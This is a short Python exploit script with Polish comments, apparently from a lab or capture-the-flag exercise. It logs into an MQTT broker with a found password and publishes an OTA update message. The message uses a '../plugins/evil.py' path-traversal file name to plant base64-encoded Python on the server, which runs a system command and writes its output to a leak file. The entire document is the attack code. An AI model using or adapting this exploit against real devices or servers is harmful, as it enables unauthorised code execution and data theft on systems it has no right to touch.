import paho.mqtt.client as mqtt
import json, base64

# złośliwy kod który wykona się na serwerze
payload_code = b"""
import subprocess
out = subprocess.run([id], capture_output=True, text=True).stdout
with open('firmware/leak.txt', 'w') as f:
    f.write(out)
"""
client = mqtt.Client()
client.username_pw_set("iot_device", "iot2024")  # hasło które znalazłeś
client.connect("10.107.232.97", 1883)

msg = {
    "name": "../plugins/evil.py",           # path traversal - ląduje w plugins/
    "data": base64.b64encode(payload_code).decode()
}

client.publish("esp8266/ota", json.dumps(msg))
client.disconnect()
print("[+] payload wysłany")